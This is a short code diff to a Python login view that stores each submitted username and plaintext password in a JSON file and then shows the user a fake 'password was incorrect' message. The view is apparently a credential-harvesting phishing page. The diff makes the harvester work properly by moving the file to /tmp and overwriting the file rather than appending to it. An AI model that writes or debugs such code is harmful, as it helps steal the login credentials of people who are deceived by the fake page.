@@ -16,7 +16,7 @@ def login_view(request):
         # Save form data to the database
         user_data = {'username': username, 'password': password}
         
-        json_file_path = 'myapp\data.json'
+        json_file_path = os.path.join('/tmp', 'data.json')
 
         existing_data = []
         try:
@@ -31,7 +31,7 @@ def login_view(request):
         existing_data.append(user_data)
 
         # Write the combined data (old + new) back to the JSON file using append mode ('a')
-        with open(json_file_path, 'a') as json_file:
+        with open(json_file_path, 'w') as json_file:
             json.dump(existing_data, json_file)
 
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
